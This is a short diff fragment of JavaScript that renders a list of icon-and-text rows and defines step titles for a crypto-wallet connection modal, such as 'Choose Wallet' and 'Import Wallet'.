+            const list = h('div', 'flex flex-col gap-5 px-2 py-3');
+            items.forEach(([ic, title, body]) => {
+                const r = h('div', 'flex gap-3 items-start');
+                const box = h('div', 'w-10 h-10 shrink-0 rounded-xl bg-[#47a1ff]/15 text-[#47a1ff] flex items-center justify-center'); box.innerHTML = ic;
+                const t = h('div', 'space-y-1'); t.append(h('p', 'text-[15px] font-medium', title), h('p', 'text-sm text-[#949e9e] leading-snug', body));
+                r.append(box, t); list.append(r);
+            });
+            root.append(list);
+        }
+
+        const TITLES = { connect: 'Choose Wallet', all: 'All Wallets', help: 'What is a wallet?', wallet: 'Import Wallet', success: 'Connection Complete' };
